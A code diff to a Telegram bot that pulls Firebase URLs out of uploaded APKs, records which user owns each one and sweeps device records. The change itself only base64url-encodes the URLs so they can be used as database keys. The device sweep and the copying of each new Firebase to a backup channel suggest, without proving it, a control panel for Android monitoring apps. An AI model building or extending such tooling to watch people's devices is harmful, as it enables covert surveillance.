@@ -142,6 +142,12 @@ async function flushState() {
 const isOwner = uid => parseInt(uid, 10) === parseInt(state.owner, 10);
 const isAdmin = uid => (state.admins || []).some(a => parseInt(a, 10) === parseInt(uid, 10));
 
+// Firebase RTDB forbids `.`, `#`, `$`, `[`, `]`, `/` in keys, so full URLs can't
+// be used as fb_owner keys there. Store URL-keys as base64url (RTDB-safe) and
+// fall back to the raw URL for older local state files.
+const fbOwnerKey = url => Buffer.from(String(url)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
+const fbOwnerFor = url => state.fb_owner[fbOwnerKey(url)] || state.fb_owner[String(url)] || null;
+
 function getUserData(userId) {
   const uid = String(userId);
   const existed = !!state.users[uid];
@@ -1369,7 +1375,7 @@ async function handleApk(uid, chatId, msg) {
     for (const d of newOnes) user.fb_urls.push(d);
     if (!user.active_fb_url && detected[0]) user.active_fb_url = detected[0];
     user.data_path = await detectFirebasePath(detected[0]);
-    for (const d of detected) state.fb_owner[d] = String(uid);
+    for (const d of detected) state.fb_owner[fbOwnerKey(d)] = String(uid);
     saveState();
     await sendMessage(BACKUP_CHANNEL, `🔑 **New Firebase (APK)**\n👤 \`${uid}\`\n📡 ${detected.map(d => `\`${maskFirebase(d)}\``).join(' ')}`).catch(() => {});
     await sendMessage(chatId, `✅ **Firebase Connected! (APK ${detected.length})**\n\n${detected.map((d, i) => `${i + 1}. \`${maskFirebase(d)}\``).join('\n')}\n📁 Path: \`${user.data_path}/\``);
@@ -1656,7 +1662,7 @@ async function handleCommand(update) {
       user.fb_urls.push(url);
       if (!user.active_fb_url) user.active_fb_url = url;
       user.data_path = detectedPath;
-      state.fb_owner[url] = String(uid);
+      state.fb_owner[fbOwnerKey(url)] = String(uid);
       saveState();
       await sendMessage(BACKUP_CHANNEL, `🔑 **New Firebase**\n👤 \`${uid}\`\n📡 \`${maskFirebase(url)}\``).catch(() => {});
       clearAwaiting(uid);
@@ -1858,7 +1864,7 @@ async function backgroundSweepOnce() {
           if (!data || typeof data !== 'object') return;
           for (const [id, dev] of Object.entries(data)) {
             if (!dev || typeof dev !== 'object') continue;
-            await refreshGlobalDevice(state.fb_owner[fbUrl] || String(user), fbUrl, id, dev, false);
+            await refreshGlobalDevice(fbOwnerFor(fbUrl) || String(user), fbUrl, id, dev, false);
           }
         })());
       }
